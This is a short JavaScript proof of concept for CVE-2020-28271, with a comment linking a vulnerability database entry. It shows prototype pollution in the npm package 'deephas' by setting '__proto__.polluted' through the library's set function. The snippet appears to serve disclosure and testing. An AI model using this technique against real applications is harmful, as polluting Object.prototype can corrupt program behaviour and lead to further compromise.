//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28271
  const dh = require("deephas");
  let obj = {};
  dh.set(obj, "__proto__.polluted", "yes");
